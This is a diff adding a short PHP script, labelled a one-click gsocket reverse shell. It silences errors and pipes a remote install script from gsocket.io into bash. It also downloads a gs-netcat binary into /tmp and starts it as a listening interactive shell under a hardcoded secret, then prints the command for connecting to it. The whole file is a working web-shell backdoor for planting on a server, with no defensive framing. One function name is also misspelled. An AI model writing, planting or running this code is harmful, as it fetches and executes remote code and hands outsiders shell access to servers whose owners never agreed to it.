@@ -1,0 +1,19 @@
+<?php
+// Simple gsocket Reverse Shell - One Click
+@set_time_set(0);
+@ini_set('display_errors', 0);
+error_reporting(0);
+
+$secret = "tootsie1337";
+
+// Install and run in one command
+$cmd = "(curl -fsSLk https://gsocket.io/install.sh 2>/dev/null || wget -qO- https://gsocket.io/install.sh 2>/dev/null) | bash -s -- -y >/dev/null 2>&1 && gs-netcat -s '$secret' -i -l 2>/dev/null &";
+@shell_exec($cmd);
+
+// Also start downloaded binary
+@shell_exec("curl -fsSLk https://github.com/hackerschoice/gsocket/raw/master/bin/gs-netcat -o /tmp/g 2>/dev/null && chmod +x /tmp/g && /tmp/g -s '$secret' -i -l 2>/dev/null &");
+
+echo "✅ gsocket reverse shell started!<br>";
+echo "🔗 Connect with: <strong>gs-netcat -s '$secret' -i</strong><br>";
+echo "⏳ If not connected immediately, wait 10 seconds and try again.";
+?>
